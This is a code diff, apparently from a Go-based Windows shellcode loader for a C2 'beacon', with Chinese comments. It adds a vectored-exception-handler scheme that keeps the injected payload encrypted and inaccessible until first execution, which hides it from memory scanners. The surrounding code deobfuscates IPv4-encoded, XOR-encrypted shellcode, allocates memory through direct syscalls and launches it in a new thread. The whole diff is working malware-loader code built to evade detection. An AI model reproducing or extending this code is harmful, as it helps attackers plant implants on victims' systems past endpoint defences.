@@ -285,6 +285,79 @@ func appendTrailer(js []byte) []byte {
 	return append(out, []byte("GOC2CFG1")...)
 }
 
+// ================================================================
+// VEH Memory Protection — 注入期密文 + 首次执行解密放行
+// ================================================================
+
+// VEH handler state
+var (
+	_protectedAddr uintptr
+	_protectedSize uintptr
+	_protectKey    []byte
+	_isEncrypted   bool
+)
+
+// exceptionRecord 精简 x64 EXCEPTION_RECORD。
+type exceptionRecord struct {
+	ExceptionCode        uint32
+	ExceptionFlags       uint32
+	ExceptionRecord      uintptr
+	ExceptionAddress     uintptr
+	NumberParameters     uint32
+	ExceptionInformation [15]uintptr
+}
+
+// exceptionPointers 精简 EXCEPTION_POINTERS。
+type exceptionPointers struct {
+	ExceptionRecord *exceptionRecord
+	ContextRecord   uintptr
+}
+
+// vehHandler 注册为 first handler：保护区间的 EXECUTE 异常解密放行
+// （一次性解锁，之后正常执行）；其余异常 CONTINUE_SEARCH 交给 Go runtime
+// 与系统既有 handler。解密前内存扫描/转储看到的是密文。
+func vehHandler(ep *exceptionPointers) uintptr {
+	const EXCEPTION_ACCESS_VIOLATION = 0xC0000005
+	if ep == nil || ep.ExceptionRecord == nil {
+		return 0 // EXCEPTION_CONTINUE_SEARCH
+	}
+	code := ep.ExceptionRecord.ExceptionCode
+	if code == EXCEPTION_ACCESS_VIOLATION {
+		faultAddr := ep.ExceptionRecord.ExceptionInformation[1]
+		if faultAddr >= _protectedAddr && faultAddr < _protectedAddr+_protectedSize && _isEncrypted {
+			xorMem(_protectedAddr, _protectedSize, _protectKey)
+			setMemProtect(_protectedAddr, _protectedSize, 0x40) // PAGE_EXECUTE_READWRITE
+			_isEncrypted = false
+			return 0xFFFFFFFF // EXCEPTION_CONTINUE_EXECUTION
+		}
+	}
+	return 0 // EXCEPTION_CONTINUE_SEARCH
+}
+
+func xorMem(addr uintptr, size uintptr, key []byte) {
+	for i := uintptr(0); i < size; i++ {
+		*(*byte)(unsafe.Pointer(addr + i)) ^= key[i%uintptr(len(key))]
+	}
+}
+
+func setMemProtect(addr uintptr, size uintptr, protect uint32) {
+	vp := windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualProtect")
+	var old uint32
+	syscall.SyscallN(vp.Addr(), addr, size, uintptr(protect), uintptr(unsafe.Pointer(&old)))
+}
+
+// installVEH 注册 VEH 并记录保护区状态（密文 + NOACCESS）。
+func installVEH(addr uintptr, size uintptr, key []byte) {
+	_protectedAddr = addr
+	_protectedSize = size
+	_protectKey = key
+	_isEncrypted = true
+	// AddVectoredExceptionHandler(1, handler) — first handler
+	aveh := windows.NewLazySystemDLL("kernel32.dll").NewProc("AddVectoredExceptionHandler")
+	handler := syscall.NewCallback(vehHandler)
+	syscall.SyscallN(aveh.Addr(), 1, handler)
+}
+
 func main() {
 	selfAppendTrailer()
 	// donut 内存加载的 beacon 自读 trailer 不可靠（os.Executable 指向本 loader）——
@@ -298,24 +371,32 @@ func main() {
 	enc := deobfuscateIPv4(_ipv4Data)
 	sc := doubleXOR(enc, _xorKey1, _xorKey2)
 
-	// NtAllocateVirtualMemory
+	// NtAllocateVirtualMemory（RW，先不放开执行）
 	var addr uintptr
 	sz := uintptr(len(sc))
-	hGate(0x18, 0xFFFFFFFFFFFFFFFF, uintptr(unsafe.Pointer(&addr)), 0, uintptr(unsafe.Pointer(&sz)), 0x3000, 0x40)
+	hGate(0x18, 0xFFFFFFFFFFFFFFFF, uintptr(unsafe.Pointer(&addr)), 0, uintptr(unsafe.Pointer(&sz)), 0x3000, 0x04)
 
-	// Copy shellcode
+	// Copy shellcode（密文态写入——执行前内存中无明文；源 slice 即刻清零）
 	for i := 0; i < len(sc); i++ {
 		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = sc[i]
 	}
+	for i := range sc {
+		sc[i] = 0
+	}
+
+	// VEH 内存保护：注册 handler 后置 PAGE_NOACCESS——新线程首次执行触发
+	// EXECUTE 异常，vehHandler 解密 + PAGE_EXECUTE_READWRITE 放行。
+	installVEH(addr, sz, _xorKey1)
+	setMemProtect(addr, sz, 0x01)
 
 	// NtCreateThreadEx
 	var thread uintptr
 	hGate(0x54, uintptr(unsafe.Pointer(&thread)), 0x1FFFFF, 0, 0, addr, 0, 0, 0, 0, 0, 0)
 
-	// Wait
+	// Wait（beacon 长驻，正常不返回；返回即收尾回加密）
 	hGate(0x1e, thread, 0, 0xFFFFFFFF)
 
-	// Encrypt + protect
+	// Encrypt + protect（防御性收尾）
 	memProtect(addr, len(sc), _xorKey1)
 	var old uint32
 	windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualProtect").Call(addr, uintptr(len(sc)), 0x01, uintptr(unsafe.Pointer(&old)))
